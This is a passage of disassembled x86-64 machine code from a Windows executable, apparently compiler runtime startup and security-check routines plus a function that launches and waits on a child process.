   140001789:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000178c:	45 33 c0             	xor    %r8d,%r8d
   14000178f:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140001794:	48 8b d6             	mov    %rsi,%rdx
   140001797:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   14000179c:	33 c9                	xor    %ecx,%ecx
   14000179e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400017a3:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   1400017a8:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400017ad:	33 c0                	xor    %eax,%eax
   1400017af:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400017b4:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400017b9:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400017bd:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400017c4:	00 
   1400017c5:	0f 11 44 24 74       	movups %xmm0,0x74(%rsp)
   1400017ca:	0f 11 45 84          	movups %xmm0,-0x7c(%rbp)
   1400017ce:	0f 11 45 94          	movups %xmm0,-0x6c(%rbp)
   1400017d2:	0f 11 45 a4          	movups %xmm0,-0x5c(%rbp)
   1400017d6:	0f 11 45 b4          	movups %xmm0,-0x4c(%rbp)
   1400017da:	0f 11 45 c4          	movups %xmm0,-0x3c(%rbp)
   1400017de:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   1400017e3:	ff 15 3f 38 01 00    	call   *0x1383f(%rip)        # 0x140015028
   1400017e9:	85 c0                	test   %eax,%eax
   1400017eb:	75 6b                	jne    0x140001858
   1400017ed:	ff 15 7d 38 01 00    	call   *0x1387d(%rip)        # 0x140015070
   1400017f3:	48 8b ce             	mov    %rsi,%rcx
   1400017f6:	8b f8                	mov    %eax,%edi
   1400017f8:	e8 13 60 00 00       	call   0x140007810
   1400017fd:	48 8d 48 32          	lea    0x32(%rax),%rcx
   140001801:	b8 02 00 00 00       	mov    $0x2,%eax
   140001806:	48 f7 e1             	mul    %rcx
   140001809:	49 0f 42 c5          	cmovb  %r13,%rax
   14000180d:	48 8b c8             	mov    %rax,%rcx
   140001810:	e8 ff 00 00 00       	call   0x140001914
   140001815:	44 8b cf             	mov    %edi,%r9d
   140001818:	48 8d 15 81 3e 01 00 	lea    0x13e81(%rip),%rdx        # 0x1400156a0
   14000181f:	4c 8b c6             	mov    %rsi,%r8
   140001822:	48 8b c8             	mov    %rax,%rcx
   140001825:	48 8b d8             	mov    %rax,%rbx
   140001828:	ff 15 ba 3a 01 00    	call   *0x13aba(%rip)        # 0x1400152e8
   14000182e:	45 33 c9             	xor    %r9d,%r9d
   140001831:	45 33 c0             	xor    %r8d,%r8d
   140001834:	48 8b d3             	mov    %rbx,%rdx
   140001837:	33 c9                	xor    %ecx,%ecx
   140001839:	ff 15 b1 3a 01 00    	call   *0x13ab1(%rip)        # 0x1400152f0
   14000183f:	48 8b cb             	mov    %rbx,%rcx
   140001842:	e8 d5 00 00 00       	call   0x14000191c
   140001847:	48 8b ce             	mov    %rsi,%rcx
   14000184a:	bb 2d 23 00 00       	mov    $0x232d,%ebx
   14000184f:	e8 c8 00 00 00       	call   0x14000191c
   140001854:	8b c3                	mov    %ebx,%eax
   140001856:	eb 5c                	jmp    0x1400018b4
   140001858:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000185d:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140001862:	ff 15 e0 37 01 00    	call   *0x137e0(%rip)        # 0x140015048
   140001868:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000186d:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140001872:	c7 44 24 50 2e 23 00 	movl   $0x232e,0x50(%rsp)
   140001879:	00 
   14000187a:	ff 15 a0 37 01 00    	call   *0x137a0(%rip)        # 0x140015020
   140001880:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140001885:	ff 15 ed 37 01 00    	call   *0x137ed(%rip)        # 0x140015078
   14000188b:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001890:	ff 15 e2 37 01 00    	call   *0x137e2(%rip)        # 0x140015078
   140001896:	8b 5c 24 50          	mov    0x50(%rsp),%ebx
   14000189a:	85 db                	test   %ebx,%ebx
   14000189c:	74 0c                	je     0x1400018aa
   14000189e:	48 8b ce             	mov    %rsi,%rcx
   1400018a1:	e8 76 00 00 00       	call   0x14000191c
   1400018a6:	8b c3                	mov    %ebx,%eax
   1400018a8:	eb 0a                	jmp    0x1400018b4
   1400018aa:	48 8b ce             	mov    %rsi,%rcx
   1400018ad:	e8 6a 00 00 00       	call   0x14000191c
   1400018b2:	33 c0                	xor    %eax,%eax
   1400018b4:	48 8b b4 24 30 07 00 	mov    0x730(%rsp),%rsi
   1400018bb:	00 
   1400018bc:	48 8b 9c 24 68 07 00 	mov    0x768(%rsp),%rbx
   1400018c3:	00 
   1400018c4:	4c 8b ac 24 28 07 00 	mov    0x728(%rsp),%r13
   1400018cb:	00 
   1400018cc:	48 8b 8d 10 06 00 00 	mov    0x610(%rbp),%rcx
   1400018d3:	48 33 cc             	xor    %rsp,%rcx
   1400018d6:	e8 45 01 00 00       	call   0x140001a20
   1400018db:	48 81 c4 38 07 00 00 	add    $0x738,%rsp
   1400018e2:	41 5f                	pop    %r15
   1400018e4:	41 5c                	pop    %r12
   1400018e6:	5f                   	pop    %rdi
   1400018e7:	5d                   	pop    %rbp
   1400018e8:	c3                   	ret
   1400018e9:	cc                   	int3
   1400018ea:	cc                   	int3
   1400018eb:	cc                   	int3
   1400018ec:	48 83 ec 28          	sub    $0x28,%rsp
   1400018f0:	e8 3b fc ff ff       	call   0x140001530
   1400018f5:	48 83 08 04          	orq    $0x4,(%rax)
   1400018f9:	e8 0e 00 00 00       	call   0x14000190c
   1400018fe:	48 83 08 02          	orq    $0x2,(%rax)
   140001902:	33 c0                	xor    %eax,%eax
   140001904:	48 83 c4 28          	add    $0x28,%rsp
   140001908:	c3                   	ret
   140001909:	cc                   	int3
   14000190a:	cc                   	int3
   14000190b:	cc                   	int3
   14000190c:	48 8d 05 f5 01 02 00 	lea    0x201f5(%rip),%rax        # 0x140021b08
   140001913:	c3                   	ret
   140001914:	e9 93 03 00 00       	jmp    0x140001cac
   140001919:	cc                   	int3
   14000191a:	cc                   	int3
   14000191b:	cc                   	int3
   14000191c:	e9 c7 03 00 00       	jmp    0x140001ce8
   140001921:	cc                   	int3
   140001922:	cc                   	int3
   140001923:	cc                   	int3
   140001924:	48 83 ec 28          	sub    $0x28,%rsp
   140001928:	4d 8b 41 38          	mov    0x38(%r9),%r8
   14000192c:	48 8b ca             	mov    %rdx,%rcx
   14000192f:	49 8b d1             	mov    %r9,%rdx
   140001932:	e8 0d 00 00 00       	call   0x140001944
   140001937:	b8 01 00 00 00       	mov    $0x1,%eax
   14000193c:	48 83 c4 28          	add    $0x28,%rsp
   140001940:	c3                   	ret
   140001941:	cc                   	int3
   140001942:	cc                   	int3
   140001943:	cc                   	int3
   140001944:	40 53                	rex push %rbx
   140001946:	45 8b 18             	mov    (%r8),%r11d
   140001949:	48 8b da             	mov    %rdx,%rbx
   14000194c:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140001950:	4c 8b c9             	mov    %rcx,%r9
   140001953:	41 f6 00 04          	testb  $0x4,(%r8)
   140001957:	4c 8b d1             	mov    %rcx,%r10
   14000195a:	74 13                	je     0x14000196f
   14000195c:	41 8b 40 08          	mov    0x8(%r8),%eax
   140001960:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140001964:	f7 d8                	neg    %eax
   140001966:	4c 03 d1             	add    %rcx,%r10
   140001969:	48 63 c8             	movslq %eax,%rcx
   14000196c:	4c 23 d1             	and    %rcx,%r10
   14000196f:	49 63 c3             	movslq %r11d,%rax
   140001972:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140001976:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000197a:	8b 48 08             	mov    0x8(%rax),%ecx
   14000197d:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140001981:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140001986:	74 10                	je     0x140001998
   140001988:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   14000198d:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   140001992:	48 23 c1             	and    %rcx,%rax
   140001995:	4c 03 c8             	add    %rax,%r9
   140001998:	4c 33 ca             	xor    %rdx,%r9
   14000199b:	49 8b c9             	mov    %r9,%rcx
   14000199e:	5b                   	pop    %rbx
   14000199f:	e9 7c 00 00 00       	jmp    0x140001a20
   1400019a4:	cc                   	int3
   1400019a5:	cc                   	int3
   1400019a6:	cc                   	int3
   1400019a7:	cc                   	int3
   1400019a8:	cc                   	int3
   1400019a9:	cc                   	int3
   1400019aa:	cc                   	int3
   1400019ab:	cc                   	int3
   1400019ac:	cc                   	int3
   1400019ad:	cc                   	int3
   1400019ae:	cc                   	int3
   1400019af:	cc                   	int3
   1400019b0:	cc                   	int3
   1400019b1:	cc                   	int3
   1400019b2:	cc                   	int3
   1400019b3:	cc                   	int3
   1400019b4:	cc                   	int3
   1400019b5:	cc                   	int3
   1400019b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400019bd:	00 00 00 
   1400019c0:	48 83 ec 10          	sub    $0x10,%rsp
   1400019c4:	4c 89 14 24          	mov    %r10,(%rsp)
   1400019c8:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   1400019cd:	4d 33 db             	xor    %r11,%r11
   1400019d0:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   1400019d5:	4c 2b d0             	sub    %rax,%r10
   1400019d8:	4d 0f 42 d3          	cmovb  %r11,%r10
   1400019dc:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   1400019e3:	00 00 
   1400019e5:	4d 3b d3             	cmp    %r11,%r10
   1400019e8:	73 16                	jae    0x140001a00
   1400019ea:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   1400019f0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   1400019f7:	41 c6 03 00          	movb   $0x0,(%r11)
   1400019fb:	4d 3b d3             	cmp    %r11,%r10
   1400019fe:	75 f0                	jne    0x1400019f0
   140001a00:	4c 8b 14 24          	mov    (%rsp),%r10
   140001a04:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140001a09:	48 83 c4 10          	add    $0x10,%rsp
   140001a0d:	c3                   	ret
   140001a0e:	cc                   	int3
   140001a0f:	cc                   	int3
   140001a10:	cc                   	int3
   140001a11:	cc                   	int3
   140001a12:	cc                   	int3
   140001a13:	cc                   	int3
   140001a14:	cc                   	int3
   140001a15:	cc                   	int3
   140001a16:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001a1d:	00 00 00 
   140001a20:	48 3b 0d d9 f5 01 00 	cmp    0x1f5d9(%rip),%rcx        # 0x140021000
   140001a27:	75 10                	jne    0x140001a39
   140001a29:	48 c1 c1 10          	rol    $0x10,%rcx
   140001a2d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001a32:	75 01                	jne    0x140001a35
   140001a34:	c3                   	ret
   140001a35:	48 c1 c9 10          	ror    $0x10,%rcx
   140001a39:	e9 e6 02 00 00       	jmp    0x140001d24
   140001a3e:	cc                   	int3
   140001a3f:	cc                   	int3
   140001a40:	40 53                	rex push %rbx
   140001a42:	48 83 ec 20          	sub    $0x20,%rsp
   140001a46:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001a4b:	e8 8c 62 00 00       	call   0x140007cdc
   140001a50:	e8 13 07 00 00       	call   0x140002168
   140001a55:	8b c8                	mov    %eax,%ecx
   140001a57:	e8 a4 6c 00 00       	call   0x140008700
   140001a5c:	e8 fb 06 00 00       	call   0x14000215c
   140001a61:	8b d8                	mov    %eax,%ebx
   140001a63:	e8 34 6e 00 00       	call   0x14000889c
   140001a68:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001a6d:	89 18                	mov    %ebx,(%rax)
   140001a6f:	e8 70 04 00 00       	call   0x140001ee4
   140001a74:	84 c0                	test   %al,%al
   140001a76:	74 73                	je     0x140001aeb
   140001a78:	e8 a7 09 00 00       	call   0x140002424
   140001a7d:	48 8d 0d dc 09 00 00 	lea    0x9dc(%rip),%rcx        # 0x140002460
   140001a84:	e8 0b 06 00 00       	call   0x140002094
   140001a89:	e8 d2 06 00 00       	call   0x140002160
   140001a8e:	8b c8                	mov    %eax,%ecx
   140001a90:	e8 e3 64 00 00       	call   0x140007f78
   140001a95:	85 c0                	test   %eax,%eax
   140001a97:	75 52                	jne    0x140001aeb
   140001a99:	e8 d2 06 00 00       	call   0x140002170
   140001a9e:	e8 01 07 00 00       	call   0x1400021a4
   140001aa3:	85 c0                	test   %eax,%eax
   140001aa5:	74 0c                	je     0x140001ab3
   140001aa7:	48 8d 0d ae 06 00 00 	lea    0x6ae(%rip),%rcx        # 0x14000215c
   140001aae:	e8 9d 62 00 00       	call   0x140007d50
   140001ab3:	e8 cc 06 00 00       	call   0x140002184
   140001ab8:	e8 c7 06 00 00       	call   0x140002184
   140001abd:	e8 9a 06 00 00       	call   0x14000215c
   140001ac2:	8b c8                	mov    %eax,%ecx
   140001ac4:	e8 23 6d 00 00       	call   0x1400087ec
   140001ac9:	e8 b2 06 00 00       	call   0x140002180
   140001ace:	84 c0                	test   %al,%al
   140001ad0:	74 05                	je     0x140001ad7
   140001ad2:	e8 6d 68 00 00       	call   0x140008344
   140001ad7:	e8 80 06 00 00       	call   0x14000215c
   140001adc:	e8 73 08 00 00       	call   0x140002354
   140001ae1:	85 c0                	test   %eax,%eax
   140001ae3:	75 06                	jne    0x140001aeb
   140001ae5:	48 83 c4 20          	add    $0x20,%rsp
   140001ae9:	5b                   	pop    %rbx
   140001aea:	c3                   	ret
   140001aeb:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001af0:	e8 d7 06 00 00       	call   0x1400021cc
   140001af5:	cc                   	int3
   140001af6:	cc                   	int3
   140001af7:	cc                   	int3
   140001af8:	48 83 ec 28          	sub    $0x28,%rsp
   140001afc:	e8 87 06 00 00       	call   0x140002188
   140001b01:	33 c0                	xor    %eax,%eax
   140001b03:	48 83 c4 28          	add    $0x28,%rsp
   140001b07:	c3                   	ret
   140001b08:	48 83 ec 28          	sub    $0x28,%rsp
   140001b0c:	e8 9f 08 00 00       	call   0x1400023b0
   140001b11:	e8 46 06 00 00       	call   0x14000215c
   140001b16:	8b c8                	mov    %eax,%ecx
   140001b18:	48 83 c4 28          	add    $0x28,%rsp
   140001b1c:	e9 4f 6d 00 00       	jmp    0x140008870
   140001b21:	cc                   	int3
   140001b22:	cc                   	int3
   140001b23:	cc                   	int3
   140001b24:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001b29:	57                   	push   %rdi
   140001b2a:	48 83 ec 30          	sub    $0x30,%rsp
   140001b2e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001b33:	e8 70 03 00 00       	call   0x140001ea8
   140001b38:	84 c0                	test   %al,%al
   140001b3a:	0f 84 30 01 00 00    	je     0x140001c70
   140001b40:	40 32 ff             	xor    %dil,%dil
   140001b43:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001b48:	e8 1f 03 00 00       	call   0x140001e6c
   140001b4d:	8a d8                	mov    %al,%bl
   140001b4f:	8b 0d 2b 05 02 00    	mov    0x2052b(%rip),%ecx        # 0x140022080
   140001b55:	83 f9 01             	cmp    $0x1,%ecx
   140001b58:	0f 84 1d 01 00 00    	je     0x140001c7b
   140001b5e:	85 c9                	test   %ecx,%ecx
   140001b60:	75 4a                	jne    0x140001bac
   140001b62:	c7 05 14 05 02 00 01 	movl   $0x1,0x20514(%rip)        # 0x140022080
   140001b69:	00 00 00 
   140001b6c:	48 8d 15 1d 38 01 00 	lea    0x1381d(%rip),%rdx        # 0x140015390
   140001b73:	48 8d 0d d6 37 01 00 	lea    0x137d6(%rip),%rcx        # 0x140015350
   140001b7a:	e8 59 68 00 00       	call   0x1400083d8
   140001b7f:	85 c0                	test   %eax,%eax
   140001b81:	74 0a                	je     0x140001b8d
   140001b83:	b8 ff 00 00 00       	mov    $0xff,%eax
   140001b88:	e9 d8 00 00 00       	jmp    0x140001c65
   140001b8d:	48 8d 15 b4 37 01 00 	lea    0x137b4(%rip),%rdx        # 0x140015348
   140001b94:	48 8d 0d 9d 37 01 00 	lea    0x1379d(%rip),%rcx        # 0x140015338
   140001b9b:	e8 00 68 00 00       	call   0x1400083a0
   140001ba0:	c7 05 d6 04 02 00 02 	movl   $0x2,0x204d6(%rip)        # 0x140022080
   140001ba7:	00 00 00 
   140001baa:	eb 08                	jmp    0x140001bb4
   140001bac:	40 b7 01             	mov    $0x1,%dil
   140001baf:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001bb4:	8a cb                	mov    %bl,%cl
   140001bb6:	e8 4d 04 00 00       	call   0x140002008
   140001bbb:	e8 f0 05 00 00       	call   0x1400021b0
   140001bc0:	48 8b d8             	mov    %rax,%rbx
   140001bc3:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001bc7:	74 1e                	je     0x140001be7
   140001bc9:	48 8b c8             	mov    %rax,%rcx
   140001bcc:	e8 9f 03 00 00       	call   0x140001f70
   140001bd1:	84 c0                	test   %al,%al
   140001bd3:	74 12                	je     0x140001be7
   140001bd5:	45 33 c0             	xor    %r8d,%r8d
   140001bd8:	41 8d 50 02          	lea    0x2(%r8),%edx
   140001bdc:	33 c9                	xor    %ecx,%ecx
   140001bde:	48 8b 03             	mov    (%rbx),%rax
   140001be1:	ff 15 29 37 01 00    	call   *0x13729(%rip)        # 0x140015310
   140001be7:	e8 cc 05 00 00       	call   0x1400021b8
   140001bec:	48 8b d8             	mov    %rax,%rbx
   140001bef:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001bf3:	74 14                	je     0x140001c09
   140001bf5:	48 8b c8             	mov    %rax,%rcx
   140001bf8:	e8 73 03 00 00       	call   0x140001f70
   140001bfd:	84 c0                	test   %al,%al
   140001bff:	74 08                	je     0x140001c09
   140001c01:	48 8b 0b             	mov    (%rbx),%rcx
   140001c04:	e8 af 6a 00 00       	call   0x1400086b8
   140001c09:	e8 0a 07 00 00       	call   0x140002318
   140001c0e:	0f b7 d8             	movzwl %ax,%ebx
   140001c11:	e8 36 67 00 00       	call   0x14000834c
   140001c16:	44 8b cb             	mov    %ebx,%r9d
   140001c19:	4c 8b c0             	mov    %rax,%r8
   140001c1c:	33 d2                	xor    %edx,%edx
   140001c1e:	48 8d 0d db e3 ff ff 	lea    -0x1c25(%rip),%rcx        # 0x140000000
   140001c25:	e8 76 f9 ff ff       	call   0x1400015a0
   140001c2a:	8b d8                	mov    %eax,%ebx
   140001c2c:	e8 2b 07 00 00       	call   0x14000235c
   140001c31:	84 c0                	test   %al,%al
   140001c33:	74 50                	je     0x140001c85
   140001c35:	40 84 ff             	test   %dil,%dil
   140001c38:	75 05                	jne    0x140001c3f
   140001c3a:	e8 5d 6a 00 00       	call   0x14000869c
   140001c3f:	33 d2                	xor    %edx,%edx
   140001c41:	b1 01                	mov    $0x1,%cl
   140001c43:	e8 e4 03 00 00       	call   0x14000202c
   140001c48:	8b c3                	mov    %ebx,%eax
   140001c4a:	eb 19                	jmp    0x140001c65
   140001c4c:	8b d8                	mov    %eax,%ebx
   140001c4e:	e8 09 07 00 00       	call   0x14000235c
   140001c53:	84 c0                	test   %al,%al
   140001c55:	74 36                	je     0x140001c8d
   140001c57:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140001c5c:	75 05                	jne    0x140001c63
   140001c5e:	e8 29 6a 00 00       	call   0x14000868c
   140001c63:	8b c3                	mov    %ebx,%eax
   140001c65:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001c6a:	48 83 c4 30          	add    $0x30,%rsp
   140001c6e:	5f                   	pop    %rdi
   140001c6f:	c3                   	ret
   140001c70:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001c75:	e8 52 05 00 00       	call   0x1400021cc
   140001c7a:	90                   	nop
   140001c7b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001c80:	e8 47 05 00 00       	call   0x1400021cc
   140001c85:	8b cb                	mov    %ebx,%ecx
   140001c87:	e8 68 6a 00 00       	call   0x1400086f4
   140001c8c:	90                   	nop
   140001c8d:	8b cb                	mov    %ebx,%ecx
   140001c8f:	e8 18 6a 00 00       	call   0x1400086ac
   140001c94:	90                   	nop
   140001c95:	cc                   	int3
   140001c96:	cc                   	int3
   140001c97:	cc                   	int3
   140001c98:	48 83 ec 28          	sub    $0x28,%rsp
   140001c9c:	e8 0b 04 00 00       	call   0x1400020ac
   140001ca1:	48 83 c4 28          	add    $0x28,%rsp
   140001ca5:	e9 7a fe ff ff       	jmp    0x140001b24
   140001caa:	cc                   	int3
   140001cab:	cc                   	int3
   140001cac:	40 53                	rex push %rbx
   140001cae:	48 83 ec 20          	sub    $0x20,%rsp
   140001cb2:	48 8b d9             	mov    %rcx,%rbx
   140001cb5:	eb 0f                	jmp    0x140001cc6
   140001cb7:	48 8b cb             	mov    %rbx,%rcx
   140001cba:	e8 f1 6b 00 00       	call   0x1400088b0
   140001cbf:	85 c0                	test   %eax,%eax
   140001cc1:	74 13                	je     0x140001cd6
   140001cc3:	48 8b cb             	mov    %rbx,%rcx
   140001cc6:	e8 e5 6c 00 00       	call   0x1400089b0
   140001ccb:	48 85 c0             	test   %rax,%rax
   140001cce:	74 e7                	je     0x140001cb7
   140001cd0:	48 83 c4 20          	add    $0x20,%rsp
   140001cd4:	5b                   	pop    %rbx
   140001cd5:	c3                   	ret
   140001cd6:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140001cda:	74 06                	je     0x140001ce2
   140001cdc:	e8 07 09 00 00       	call   0x1400025e8
   140001ce1:	cc                   	int3
   140001ce2:	e8 21 09 00 00       	call   0x140002608
   140001ce7:	cc                   	int3
   140001ce8:	e9 d3 6c 00 00       	jmp    0x1400089c0
   140001ced:	cc                   	int3
   140001cee:	cc                   	int3
   140001cef:	cc                   	int3
   140001cf0:	40 53                	rex push %rbx
   140001cf2:	48 83 ec 20          	sub    $0x20,%rsp
   140001cf6:	48 8b d9             	mov    %rcx,%rbx
   140001cf9:	33 c9                	xor    %ecx,%ecx
   140001cfb:	ff 15 df 33 01 00    	call   *0x133df(%rip)        # 0x1400150e0
   140001d01:	48 8b cb             	mov    %rbx,%rcx
   140001d04:	ff 15 ce 33 01 00    	call   *0x133ce(%rip)        # 0x1400150d8
   140001d0a:	ff 15 d8 33 01 00    	call   *0x133d8(%rip)        # 0x1400150e8
   140001d10:	48 8b c8             	mov    %rax,%rcx
   140001d13:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140001d18:	48 83 c4 20          	add    $0x20,%rsp
   140001d1c:	5b                   	pop    %rbx
   140001d1d:	48 ff 25 cc 33 01 00 	rex.W jmp *0x133cc(%rip)        # 0x1400150f0
   140001d24:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001d29:	48 83 ec 38          	sub    $0x38,%rsp
   140001d2d:	b9 17 00 00 00       	mov    $0x17,%ecx
   140001d32:	ff 15 c0 33 01 00    	call   *0x133c0(%rip)        # 0x1400150f8
   140001d38:	85 c0                	test   %eax,%eax
   140001d3a:	74 07                	je     0x140001d43
   140001d3c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d41:	cd 29                	int    $0x29
   140001d43:	48 8d 0d 66 fe 01 00 	lea    0x1fe66(%rip),%rcx        # 0x140021bb0
   140001d4a:	e8 a9 00 00 00       	call   0x140001df8
   140001d4f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001d54:	48 89 05 4d ff 01 00 	mov    %rax,0x1ff4d(%rip)        # 0x140021ca8
   140001d5b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140001d60:	48 83 c0 08          	add    $0x8,%rax
   140001d64:	48 89 05 dd fe 01 00 	mov    %rax,0x1fedd(%rip)        # 0x140021c48
   140001d6b:	48 8b 05 36 ff 01 00 	mov    0x1ff36(%rip),%rax        # 0x140021ca8
   140001d72:	48 89 05 a7 fd 01 00 	mov    %rax,0x1fda7(%rip)        # 0x140021b20
   140001d79:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140001d7e:	48 89 05 ab fe 01 00 	mov    %rax,0x1feab(%rip)        # 0x140021c30
   140001d85:	c7 05 81 fd 01 00 09 	movl   $0xc0000409,0x1fd81(%rip)        # 0x140021b10
   140001d8c:	04 00 c0 
   140001d8f:	c7 05 7b fd 01 00 01 	movl   $0x1,0x1fd7b(%rip)        # 0x140021b14
   140001d96:	00 00 00 
   140001d99:	c7 05 85 fd 01 00 01 	movl   $0x1,0x1fd85(%rip)        # 0x140021b28
   140001da0:	00 00 00 
   140001da3:	b8 08 00 00 00       	mov    $0x8,%eax
   140001da8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140001dac:	48 8d 0d 7d fd 01 00 	lea    0x1fd7d(%rip),%rcx        # 0x140021b30
   140001db3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   140001dba:	00 
   140001dbb:	b8 08 00 00 00       	mov    $0x8,%eax
   140001dc0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140001dc4:	48 8b 0d 35 f2 01 00 	mov    0x1f235(%rip),%rcx        # 0x140021000
   140001dcb:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140001dd0:	b8 08 00 00 00       	mov    $0x8,%eax
   140001dd5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140001dd9:	48 8b 0d 60 f2 01 00 	mov    0x1f260(%rip),%rcx        # 0x140021040
   140001de0:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140001de5:	48 8d 0d e4 39 01 00 	lea    0x139e4(%rip),%rcx        # 0x1400157d0
   140001dec:	e8 ff fe ff ff       	call   0x140001cf0
   140001df1:	90                   	nop
   140001df2:	48 83 c4 38          	add    $0x38,%rsp
   140001df6:	c3                   	ret
   140001df7:	cc                   	int3
   140001df8:	40 53                	rex push %rbx
   140001dfa:	56                   	push   %rsi
   140001dfb:	57                   	push   %rdi
   140001dfc:	48 83 ec 40          	sub    $0x40,%rsp
   140001e00:	48 8b d9             	mov    %rcx,%rbx
   140001e03:	ff 15 b7 32 01 00    	call   *0x132b7(%rip)        # 0x1400150c0
   140001e09:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140001e10:	33 ff                	xor    %edi,%edi
   140001e12:	45 33 c0             	xor    %r8d,%r8d
   140001e15:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001e1a:	48 8b ce             	mov    %rsi,%rcx
   140001e1d:	ff 15 a5 32 01 00    	call   *0x132a5(%rip)        # 0x1400150c8
   140001e23:	48 85 c0             	test   %rax,%rax
   140001e26:	74 3c                	je     0x140001e64
   140001e28:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140001e2d:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140001e32:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140001e39:	00 00 
   140001e3b:	4c 8b c8             	mov    %rax,%r9
   140001e3e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001e43:	4c 8b c6             	mov    %rsi,%r8
   140001e46:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001e4b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001e50:	33 c9                	xor    %ecx,%ecx
   140001e52:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001e57:	ff 15 73 32 01 00    	call   *0x13273(%rip)        # 0x1400150d0
   140001e5d:	ff c7                	inc    %edi
   140001e5f:	83 ff 02             	cmp    $0x2,%edi
   140001e62:	7c ae                	jl     0x140001e12
   140001e64:	48 83 c4 40          	add    $0x40,%rsp
   140001e68:	5f                   	pop    %rdi
   140001e69:	5e                   	pop    %rsi
   140001e6a:	5b                   	pop    %rbx
   140001e6b:	c3                   	ret
   140001e6c:	48 83 ec 28          	sub    $0x28,%rsp
   140001e70:	e8 5f 0a 00 00       	call   0x1400028d4
   140001e75:	85 c0                	test   %eax,%eax
   140001e77:	74 21                	je     0x140001e9a
   140001e79:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001e80:	00 00 
   140001e82:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001e86:	eb 05                	jmp    0x140001e8d
   140001e88:	48 3b c8             	cmp    %rax,%rcx
   140001e8b:	74 14                	je     0x140001ea1
   140001e8d:	33 c0                	xor    %eax,%eax
   140001e8f:	f0 48 0f b1 0d f0 01 	lock cmpxchg %rcx,0x201f0(%rip)        # 0x140022088
   140001e96:	02 00 
   140001e98:	75 ee                	jne    0x140001e88
   140001e9a:	32 c0                	xor    %al,%al
   140001e9c:	48 83 c4 28          	add    $0x28,%rsp
   140001ea0:	c3                   	ret
   140001ea1:	b0 01                	mov    $0x1,%al
   140001ea3:	eb f7                	jmp    0x140001e9c
   140001ea5:	cc                   	int3
   140001ea6:	cc                   	int3
   140001ea7:	cc                   	int3
   140001ea8:	48 83 ec 28          	sub    $0x28,%rsp
   140001eac:	85 c9                	test   %ecx,%ecx
   140001eae:	75 07                	jne    0x140001eb7
   140001eb0:	c6 05 d9 01 02 00 01 	movb   $0x1,0x201d9(%rip)        # 0x140022090
   140001eb7:	e8 80 07 00 00       	call   0x14000263c
